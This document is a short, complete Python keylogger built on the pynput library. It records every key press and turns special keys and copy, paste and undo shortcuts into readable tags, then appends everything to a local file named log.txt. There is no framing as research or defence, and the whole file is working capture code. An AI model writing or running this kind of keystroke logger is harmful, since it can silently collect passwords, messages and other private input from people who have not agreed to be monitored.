from pynput.keyboard import Listener


def log_keystroke(key):
    key = str(key).replace("'", "")

    #check if a "special" key is pressed and only add what could be useful
    if key.startswith("Key."):
        if key == "Key.backspace":
            key = ' $BACKSPACE '
        elif key == 'Key.space':
            key = ' '
        elif key == "Key.enter":
            key = '\n'
        elif key == 'Key.caps_lock':
            key = ' $CAPS_LOCKED '
        else:
            key = ''
    elif key.startswith('\\x'):
        #check if the user is using shortcuts
        if key == "\\x03":
            key = ' $COPY '
        if key == "\\x16":
            key = ' $PASTE '
        if key == "\\x1a":
            key = ' $BACK '
    
    with open("log.txt", 'a') as f:
        f.write(key)

def start_listener():
    with Listener(on_press=log_keystroke) as l:
        l.join()